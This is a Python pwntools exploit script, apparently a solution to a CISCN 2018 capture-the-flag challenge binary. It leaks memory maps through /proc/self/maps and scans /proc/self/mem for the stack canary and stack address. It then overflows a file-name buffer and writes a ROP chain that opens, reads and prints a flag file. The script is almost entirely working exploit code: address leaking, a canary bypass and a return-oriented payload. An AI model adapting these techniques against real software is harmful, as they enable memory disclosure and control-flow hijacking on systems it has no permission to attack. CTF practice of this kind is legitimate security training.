#coding:utf-8
import os
from pwn import *

context.log_level = 'debug'

io = process('./task_house_P4U73bf')
elf = ELF('./task_house_P4U73bf')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def init():
    io.recvuntil('Y/n?')
    io.sendline('Y')

def option(index):
    io.recvuntil(' 5.Exit\n')
    io.sendline(str(index))
    
def myopen(fname):
    option(1)
    io.recvuntil('finding?\n')
    io.send(fname) #0x28
    sleep(0.1)

def myseek(index):
    option(2)
    io.recvuntil('you?\n')
    io.sendline(str(index))
    sleep(0.1)

def myread(num):
    option(3)
    io.recvuntil('get?\n') 
    io.send(str(num))
    sleep(0.1)
    #io.recvuntil('something:\n')
    
def mywrite(content):
    option(4)
    io.recvuntil('content: \n')
    io.send(content) #0x200
    sleep(0.1)

if __name__ == '__main__':
    pause()
    init()
    myopen('/proc/self/maps\n')
    myread(10000)
    #maps =  io.recv()
    #get code、stack in heap and libc
    io.recvline()
    code = int(io.recv(12),16)
    print 'codebase is: ',hex(code)
    io.recvuntil('\n')
    for i in range(3):
      io.recvline()
    stack_start = int(io.recv(12),16)
    #print hex(stack_start)
    io.recv(1)
    stack_end =  int(io.recv(12),16)
    #print hex(stack_end)
    print 'stack in {0}-{1}'.format(hex(stack_start),hex(stack_end))
    libc.address =  stack_end 
    pause()
    
    #read /proc/self/mem , but what's offset? guess?
    #  p 0x7ff8578a2000-0x7ff84796c440=  0xff35bc0
    # 24*100000 = 0x249f00
    myopen('/proc/self/mem\n')
    #start = stack_end -0xf800000-24*100000
    start = stack_start
    myseek(start)
    canary = 0
    for i in range(24):
       #myseek(start)
       myread('100000\x00')
       io.recvline()
       ans =  io.recvuntil('1.Find ',drop=True)
       if '/mem' in ans:
          #print ans
          canary = u64(ans.split('/proc/self/mem')[0][-0x48:-0x40])
          print hex(canary)
          break
       else:
          start = start +100000

    if canary == 0:
         print 'gg!'
         exit(0)
    stack_address = start + len(ans.split('/proc/self/mem')[0])
    print hex(stack_address)
    pause()
    #stack overflow
    payload1 = '/proc/self/mem\x00'.ljust(0x18,'\x00') + p64(stack_address-0x38)
    myopen(payload1)
    pop_rdi = 0x1823
    pop_rsi_r15=0x1821
    #open + read + puts 
    payload2 = p64(code+pop_rdi)+p64(stack_address-0x38+0x100)
    payload2 += p64(code+pop_rsi_r15)+p64(0)*2
    payload2 += p64(code+elf.symbols['open']) #open(xx,'r')
    payload2 += p64(code+pop_rdi)+p64(6)
    payload2 += p64(code+pop_rsi_r15)+ p64(stack_address-0x38+0x100)*2
    payload2 += p64(code+elf.symbols['read']) #read(6,addr,xx)
    payload2 += p64(code+pop_rdi)+p64(stack_address-0x38+0x100)
    payload2 += p64(code+elf.symbols['puts'])
    payload2 = payload2.ljust(0x100,'\x00')
    payload2 += '/root/ciscn2018/flag\x00'
    mywrite(payload2)
    pause()
    
    io.interactive()
